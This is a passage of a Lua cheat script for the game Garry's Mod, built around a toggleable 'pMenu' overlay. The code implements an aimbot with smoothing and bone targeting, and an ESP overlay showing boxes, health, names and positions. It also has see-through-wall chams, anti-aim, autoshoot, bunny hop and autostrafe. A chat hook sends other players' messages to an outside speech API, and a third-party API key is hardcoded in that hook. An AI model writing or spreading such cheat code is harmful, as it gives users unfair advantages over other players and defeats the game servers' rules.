			pMenu.DrawCheckBox(Frame,170,460,"HvH pList",false,"pList")
		end
		if firsttime then
			pMenuVars.Tabs[Visuals].value = false;
			pMenuVars.Tabs[misc].value = false;
			pMenuVars.Tabs[b1gExploits].value = false;
			pMenuVars.Tabs[Aimbot].value = false;
			pMenuVars.Tabs[hvh].value = true;
		end
		firsttime = false;
	end
	local PList = vgui.Create( "DFrame" )
	PList:SetTitle( "" )
	PList:SetSize( 300, ScrH() )
	PList:SetPos(0,0)
	PList:ShowCloseButton(false)
	PList:MakePopup()
	PList.Paint = function( self, w, h )
		if pMenuVars.CheckBoxes["HvH pList"] != nil && pMenuVars.CheckBoxes["HvH pList"].value then
			if pMenuVars.Tabs["HvH"].value != nil && pMenuVars.Tabs["HvH"].value then
				pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
				draw.SimpleText("PList","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
				draw.SimpleText("Can't hit someone because their aa is good?","Font M",w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
				draw.SimpleText("Use this :)","Font M",w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
				local up = 20;
				local add = 50
				local k = 0;
				for _,v in pairs(player.GetAll()) do
					k = k + 1;
					if v == LocalPlayer() then
						k = k -1
						continue;
					end
					pMenu.DrawOutLinedRect(10,up + (k * add),280,44,Color(255,255,255,255))
					pMenu.DrawRect(10,up + (k * add),280,44,Color(18,89,131,170))
					draw.SimpleText(v:Nick(),"Font M",12,up + (k * add) + 3,Color(0,255,255,255))

					draw.SimpleText("P:","Font M",175,up + (k * add) + 3,Color(0,255,255,255))
					pMenu.DrawSlider(PList,190,up + (k * add),100,22,v:SteamID().."Force Pitch",-180,  180,  0,true)
					draw.SimpleText("Y:","Font M",175,up + (k * add) + 24,Color(0,255,255,255))
					pMenu.DrawSlider(PList,190,up + (k * add)+22,100,22,v:SteamID().."Force Yaw",-180,  180,  0,true)

					pMenu.DrawCheckBox(PList,11,up + (k * add) + 23,v:SteamID().."Baim",false,"baim")
					pMenu.DrawCheckBox(PList,75,up + (k * add) + 23,v:SteamID().."Force Ang",false,"Force Ang")
				end
			end
		end
		if Frame == NULL then
			self:Close()
		end
	end
end

function pMenu.boundingbox(ply)
	local iBoxWidth = 26;
	local iBoxHeight = 71;
	
	local pos = ply:GetBonePosition(ply:LookupBone( "ValveBiped.Bip01_Spine" ));
	if (ply:Crouching()) then
		pos = Vector(pos.x, pos.y, pos.z - 27);
		iBoxHeight = 55;
	else
		pos = Vector(pos.x,pos.y,pos.z - 42.5);
	end

	local points = {
		Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
		Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ), 
		Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ), 
		Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ), 
		Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight), 
		Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight), 
		Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight), 
		Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
	};
	local flb = points[4]:ToScreen();
	local brt = points[6]:ToScreen();
	local blb = points[1]:ToScreen();
	local frt = points[5]:ToScreen();
	local frb = points[3]:ToScreen();
	local brb = points[2]:ToScreen();
	local blt = points[7]:ToScreen();
	local flt = points[8]:ToScreen();
	local arr = { flb, brt, blb, frt, frb, brb, blt, flt };

	local t1 = flb.x;      
	local t2 = flb.y;        
	local t3 = flb.x;   
	local t4 = flb.y;   

	for i=1,8 do
		if (t1 > arr[i].x) then
			t1 = arr[i].x;
		end
		if (t4 < arr[i].y) then
			t4 = arr[i].y;
		end
		if (t3 < arr[i].x) then
			t3 = arr[i].x;
		end
		if (t2 > arr[i].y) then
			t2 = arr[i].y; 
		end
	end
	return t1,t3,t2,t4;
end
function pMenu.PredictPos(pos)
	local myvel = LocalPlayer():GetVelocity()
	local pos = pos - (myvel * engine.TickInterval()); 
	return pos;
end
function pMenu.SmoothAngle(angle,me,SmoothPercent)
	local first = Vector(angle.x - me.x, math.NormalizeAngle(angle.y - me.y), 0.0);
	local smoothX = me.x + first.x / 100 * SmoothPercent;
	local smoothY = me.y + first.y / 100 * SmoothPercent;
	return Angle(smoothX, math.NormalizeAngle(smoothY), 0.0);
end
function pMenu.GetAngle(src, dst)
	local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
	local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
	local pitch = math.atan(delta.z/hyp) * Rad * -1;
	local yaw = math.atan(delta.y / delta.x) * Rad;
	if (delta.x >= 0) then
		yaw = yaw + 180;
	end
	return Angle(pitch, math.NormalizeAngle(yaw - 180), 0.0);
end
function pMenu.GetAngleVector(src, dst)
	local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
	local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
	local pitch = math.atan(delta.z/hyp) * Rad * -1;
	local yaw = math.atan(delta.y / delta.x) * Rad;
	if (delta.x >= 0) then
		yaw = yaw + 180;
	end
	return Vector(pitch, math.NormalizeAngle(yaw - 180), 0.0);
end
function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
	if limit == nil then
		limit = 360;
	end
	local curAng = Vector(Angle.x,Angle.y + 180,0);
	local curEye = LocalPlayer():EyePos()
	local ret = NULL
	local retDist = 1000;
	for k,v in pairs(player.GetAll()) do
		if v == LocalPlayer() || !v:Alive() then
			continue;
		end
		local pos = Vector(0,0,0);
		if bonee != nil then
			pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(bonee)))
		else
			pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone)))
		end
		local tarAng = pMenu.GetAngleVector(curEye,pos);
		tarAng = Vector(tarAng.x,tarAng.y + 180,0);
		local dist = tarAng:Distance(curAng);
		if dist <= limit && dist < retDist && LocalPlayer():IsLineOfSightClear(pos) then
			ret = v;
			retDist = dist;
		end
	end
	return ret;
end
function pMenu.AAA(ply)
	local Angles = ply:EyeAngles()
	if pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"].value then
		Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
		Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
	end
	ply:SetPoseParameter("aim_pitch", Angles.p);
	ply:SetPoseParameter("body_yaw", Angles.y);
	ply:SetPoseParameter("aim_yaw", 0);
	ply:InvalidateBoneCache();
	ply:SetRenderAngles(Angle(0, Angles.y, 0));
end
hook.Add("RenderScene","tes",function()
	for k,v in pairs(player.GetAll()) do
		if v == LocalPlayer() then
			continue;
		end
		pMenu.AAA(v)
	end
end)
function pMenu.DrawESP(ply)
	local boxcolor = Color(pMenuVars.Sliders["ESP BoxColor.r"].value,pMenuVars.Sliders["ESP BoxColor.g"].value,pMenuVars.Sliders["ESP BoxColor.b"].value,255)
	local textcolor = Color(pMenuVars.Sliders["ESP TextColor.r"].value,pMenuVars.Sliders["ESP TextColor.g"].value,pMenuVars.Sliders["ESP TextColor.b"].value,255)
	local left,right,top,bottom = pMenu.boundingbox(ply)
	if pMenuVars.CheckBoxes["ESP BoundingBox"].value then
		surface.SetDrawColor(boxcolor);
		surface.DrawOutlinedRect(left + 1,top + 1, (right - left) + 1,(bottom - top) + 1)
	end
	if pMenuVars.CheckBoxes["ESP HealthBar"].value then
		surface.SetDrawColor(0,0,0,255);
		surface.DrawRect(left - 5,top - 1 + 2,4, (bottom - top) / 100 * ply:Health() + 2)
		surface.SetDrawColor(255,0,0,255);
		surface.DrawRect(left - 4,top + 2,2, (bottom - top) / 100 * ply:Health())
	end

	if (pMenuVars.CheckBoxes["ESP Name"].value) then
		draw.SimpleText(ply:Nick(),"Font L2",left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
	end
	if (pMenuVars.CheckBoxes["ESP Position"].value) then
		local pos = ply:GetPos();
		draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),"Font L2",right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
	end
	if (pMenuVars.CheckBoxes["ESP Angles"].value) then
		local pos = ply:EyeAngles();
		draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),"Font L2",right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
		draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),"Font L2",right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
		draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),"Font L2",right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
	end
	if (pMenuVars.CheckBoxes["ESP Traceline"].value) then
		local eyes = (ply:EyePos() + ply:EyeAngles():Forward() * pMenuVars.Sliders["ESP Traceline Distance"].value):ToScreen();
		local eye = ply:EyePos():ToScreen();

		surface.SetDrawColor(255,255,255,255)
		if eye.visible && eyes.visible then
			surface.DrawLine(eyes.x,eyes.y,eye.x,eye.y)
		end
	end
end
// pasted chams because l a z y 
local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
	["$ignorez"] = 1,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite",
})
local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
	["$ignorez"] = 0,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite",
})
function pMenu.Chams(v)
	local ChamVis = Color(pMenuVars.Sliders["ESP ChamVisColor.r"].value,pMenuVars.Sliders["ESP ChamVisColor.g"].value,pMenuVars.Sliders["ESP ChamVisColor.b"].value,255)
	local ChamNVis = Color(pMenuVars.Sliders["ESP ChamNVisColor.r"].value,pMenuVars.Sliders["ESP ChamNVisColor.g"].value,pMenuVars.Sliders["ESP ChamNVisColor.b"].value,255)
	cam.Start3D()
		if v:IsValid() then
			if pMenuVars.CheckBoxes["ESP XQZ"].value then
				render.MaterialOverride(chamsmat)
				render.SetColorModulation(ChamNVis.r/ 255, ChamNVis.g/255, ChamNVis.b/255)
				v:DrawModel()
			end

			render.SetColorModulation(ChamVis.r / 255, ChamVis.g/ 255, ChamVis.b/ 255) // vis
			render.MaterialOverride(chamsmat2)
			v:DrawModel()
		end
		local wep = v:GetActiveWeapon()
		local wep = v:GetActiveWeapon()
		if wep:IsValid() then
			if pMenuVars.CheckBoxes["ESP WeaponCham"].value then
				render.MaterialOverride(chamsmat)
				render.SetColorModulation(255/255, 0/255, 0/255, 255)
				wep:DrawModel()
				render.SetColorModulation(255/255, 255/255, 0/255, 255)
				render.MaterialOverride(chamsmat2)
				wep:DrawModel()
			end
		end
	cam.End3D()
end
function pMenu.bhop(pcmd)
	if (!LocalPlayer():IsOnGround() && !LocalPlayer():IsTyping() && pcmd:KeyDown(IN_JUMP)) then
		pcmd:RemoveKey(IN_JUMP)
	end
end
function pMenu.autostrafe(pcmd)
	if !(LocalPlayer():IsOnGround()) && input.IsKeyDown(KEY_SPACE) then
		if(pcmd:GetMouseX() > 1 or pcmd:GetMouseX() < -1) then
			if(pcmd:GetMouseX() < 0) then
				pcmd:SetSideMove(-400)
			else
				pcmd:SetSideMove(400)
			end
		else
			pcmd:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
			pcmd:SetSideMove((pcmd:CommandNumber() % 2 == 0) and 400 or -400)
		end
	end
end
function pMenu.ToggleMenu()
	if Frame == NULL then
		pMenu.Menu()
	else
		Frame:Close()
		Frame = NULL
	end
end
function pMenu.FixMovement(pCmd,fa,angles)
	local vec = Vector(pCmd:GetForwardMove(pCmd), pCmd:GetSideMove(), 0)
	local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
	local mang = vec:Angle()
	local yaw = angles.y - fa.y + mang.y
	if (((angles.p+90)%360) > 180) then
		yaw = 180 - yaw
	end
	yaw = ((yaw + 180)%360)-180
	pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
	pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end
function pMenu.Shoot(pcmd)
	if(LocalPlayer():KeyDown(1)) then
		pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
	else
		pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
	end
end
hook.Add("RenderScreenspaceEffects","hkRenderScreenspaceEffects",function()
	if (pMenuVars.CheckBoxes["ESP Chams"] != nil && pMenuVars.CheckBoxes["ESP Chams"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
		for k,v in pairs(player.GetAll()) do
			if v != LocalPlayer() && v:Alive() && !v:IsDormant() && v:Health() > 1 then
				pMenu.Chams(v);
			end
		end
	end
end)

hook.Add("PreDrawHalos","hkPreDrawHalos",function()
	if (pMenuVars.CheckBoxes["ESP Glow"] != nil && pMenuVars.CheckBoxes["ESP Glow"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
		local tab = {}
		for k,v in pairs(player.GetAll()) do
			if v != LocalPlayer() &&  v:Alive() then
				tab[k] = v;
			end
		end
		halo.Add( tab, Color( 255, 255, 255 ), 2, 2, 4,true,true )
	end
end)
hook.Add("HUDPaint","hkHUDPaint",function()
	for k,v in pairs(player.GetAll()) do
		if v != LocalPlayer() &&  v:Alive() then
			if pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value then
				pMenu.DrawESP(v)
			end
		end
	end
	if pMenuVars.CheckBoxes["Aibmot Show fov circle"] != nil && pMenuVars.CheckBoxes["Aibmot Show fov circle"].value then
		local End = (ScrW() / (LocalPlayer():GetFOV() + 60) ) * pMenuVars.Sliders["Aimbot FOV"].value;
		pMenu.DrawCircle(ScrW() / 2,ScrH() / 2, End, 70,Color(pMenuVars.Sliders["Aimbot Circle.r"].value,pMenuVars.Sliders["Aimbot Circle.g"].value,pMenuVars.Sliders["Aimbot Circle.b"].value,pMenuVars.Sliders["Aimbot Circle.a"].value))
	end
end)
local View = Angle();
hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
	if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
		local view = {}
		local ang = View
		view.angles = View
		local angfwd = ang:Forward();
		local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
		local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
		local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})

		view.origin = tracelines.HitPos
		view.drawviewer = true;
		return view;
	end
	if pMenuVars.CheckBoxes["MISC Thirdperson"] != nil && pMenuVars.CheckBoxes["MISC Thirdperson"].value then
		local view = {}
		local ang = angles
		view.angles = ang
		local angfwd = ang:Forward();
		local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
		local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
		local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})

		view.origin = tracelines.HitPos
		view.drawviewer = true;
		return view;
	end
end)
local t = 0;
local jitter = false;
local AShoot = false;
hook.Add("CreateMove","hkCreateMove",function(pCmd)
	if pMenuVars.CheckBoxes["MISC Bhop"] != nil && pMenuVars.CheckBoxes["MISC Bhop"].value then
		pMenu.bhop(pCmd)
	end
	if pMenuVars.CheckBoxes["MISC Autostrafe"] != nil && pMenuVars.CheckBoxes["MISC Autostrafe"].value then
		pMenu.autostrafe(pCmd)
	end
	if pMenuVars.CheckBoxes["Aibmot Enable"] != nil && pMenuVars.CheckBoxes["Aibmot Enable"].value then
		if input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value) then
			local nearest = pMenu.ClosestEntToCross(pMenuVars.Sliders["Aimbot FOV"].value,pCmd,AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone,pCmd:GetViewAngles());
			if nearest != NULL then 
				local Eye = LocalPlayer():EyePos();
				local target = nearest:GetBonePosition(nearest:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone))
				local End = Angle();
				if pMenuVars.CheckBoxes["Aibmot Smooth"].value then
					End = pMenu.SmoothAngle(pMenu.GetAngle(Eye,target),pCmd:GetViewAngles(),pMenuVars.Sliders["Aimbot Smooth AMT"].value);
				else
					End = pMenu.GetAngle(Eye,target)
				end
				pCmd:SetViewAngles(End)
			end
		end
	end
	if input.IsKeyDown(KEY_DELETE) then
		t = t + 1
		if t == 1 then
			pMenu.ToggleMenu()
		end
	else
		t = 0;
	end
	local fwdmouse = Vector(pCmd:GetMouseX(),pCmd:GetMouseY(),0)
	View.y = math.NormalizeAngle(View.y + ( ((fwdmouse.x / 250) * GetConVar("sensitivity"):GetInt() )* -1) );
	View.x = math.Clamp(View.x + ( ((fwdmouse.y / 250) * GetConVar("sensitivity"):GetInt() )),-89,89 );
	View:Normalize()
	if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
		local CurAngles = pCmd:GetViewAngles()
		local Anglez = Angle(View.x,View.y,0);
		if (pMenuVars.CheckBoxes["HvH Antiaim"].value) then
			Anglez = Angle(pMenuVars.Sliders["HvH Pitch"].value,pMenuVars.Sliders["HvH Yaw"].value,0);
			local style = pMenuVars.Sliders["HvH Style"].value;
			if style == 1 then
				jitter = !jitter;
				if jitter then
					Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 100);
				else
					Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 10);
				end
			elseif style == 2 then
				Anglez.y = math.NormalizeAngle(CurAngles.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
			elseif style == 3 then
				local rand = pMenuVars.Sliders["HvH randomY"].value;
				Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + math.random(rand * -1,rand));
			elseif style == 4 then
				local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View)
				if ent == NULL then
					Anglez.y = math.NormalizeAngle(Anglez.y + View.y);
				else
					local poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
					local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
					Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
				end
			elseif style == 5 then
				Anglez.y = math.NormalizeAngle(Anglez.y);
			elseif style == 6 then
				Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
			end
		end
		if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
			AShoot = !AShoot;
			if AShoot then
				local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View);
				if ent != NULL then
					local poz = Vector(0,0,0);
					if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
						local center = ent:OBBCenter()
						poz = ent:GetPos() + center;
					else
						poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
					end
					local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
					Anglez.x = math.Clamp(End.x,-89,89)
					Anglez.y = math.NormalizeAngle(End.y);
					pMenu.Shoot(pCmd)
				end
			end
		end
		if Anglez != nil then
			pCmd:SetViewAngles(Anglez)
		end
		pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
	end
end)
hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead )
	if pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"] != nil && pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"].value then
		strText = string.lower( strText )
		local player = ply:Nick()

		local text = player.." said "..strText;
		sound.PlayURL("https://api.ispeech.org/api/rest?apikey=34b06ef0ba220c09a817fe7924575123&action=convert&voice=usenglishmale&speed=1&pitch=100&text="..text,"mono",function(snd)
			if IsValid(snd) then
				snd:Play()
				snd:SetVolume(1)
			end
		end)
	end
end)
concommand.Add("b1g_menu",pMenu.ToggleMenu)
